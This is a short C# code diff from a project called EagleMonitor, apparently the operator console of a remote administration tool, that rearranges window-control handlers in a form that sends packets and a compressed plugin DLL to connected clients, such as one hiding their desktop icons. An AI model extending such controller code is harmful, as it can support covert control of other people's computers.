@@ -11,37 +11,11 @@ namespace EagleMonitor.Forms
     public partial class MiscellaneousForm : FormPattern
     {
         private ClientHandler clientHandler { get; set; }
+
         internal MiscellaneousForm(ClientHandler clientHandler)
         {
             this.clientHandler = clientHandler;
             InitializeComponent();
-        }
-
-        private void MiscellaneousForm_Load(object sender, EventArgs e)
-        {
-
-        }
-
-        private void closeButton_Click(object sender, EventArgs e)
-        {
-            this.Close();
-        }
-
-        private void maximizeButton_Click(object sender, EventArgs e)
-        {
-            if (this.WindowState == FormWindowState.Normal)
-            {
-                this.WindowState = FormWindowState.Maximized;
-            }
-            else
-            {
-                this.WindowState = FormWindowState.Normal;
-            }
-        }
-
-        private void minimizeButton_Click(object sender, EventArgs e)
-        {
-            this.WindowState = FormWindowState.Minimized;
         }
 
         private void increaseVolGuna2Button_Click(object sender, EventArgs e)
@@ -146,6 +120,28 @@ namespace EagleMonitor.Forms
             MiscellaneousPacket miscellaneousPacket = new MiscellaneousPacket(PacketType.MISC_HIDE_DESKTOP_ICONS);
             miscellaneousPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\Miscellaneous.dll"), 1);
             clientHandler.SendPacket(miscellaneousPacket);
+        }
+
+        private void closeButton_Click(object sender, EventArgs e)
+        {
+            this.Close();
+        }
+
+        private void maximizeButton_Click(object sender, EventArgs e)
+        {
+            if (this.WindowState == FormWindowState.Normal)
+            {
+                this.WindowState = FormWindowState.Maximized;
+            }
+            else
+            {
+                this.WindowState = FormWindowState.Normal;
+            }
+        }
+
+        private void minimizeButton_Click(object sender, EventArgs e)
+        {
+            this.WindowState = FormWindowState.Minimized;
         }
     }
 }
